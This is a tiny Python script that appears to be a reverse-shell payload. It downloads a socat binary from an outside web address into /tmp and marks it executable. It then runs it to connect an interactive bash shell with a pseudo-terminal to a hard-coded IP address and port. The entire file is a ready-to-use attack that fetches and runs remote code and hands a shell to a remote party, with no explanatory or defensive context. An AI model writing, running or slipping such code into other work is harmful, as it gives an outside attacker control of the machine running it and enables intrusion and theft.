import subprocess
subprocess.check_output(['curl', '-o', '/tmp/socat', 'https://daeken.dev/socat_linux'])
subprocess.check_output(['chmod', '0777', '/tmp/socat'])
subprocess.check_output(['/tmp/socat', 'exec:\'bash -li\',pty,stderr,setsid,sigint,sane', 'tcp:173.255.238.217:4445'])
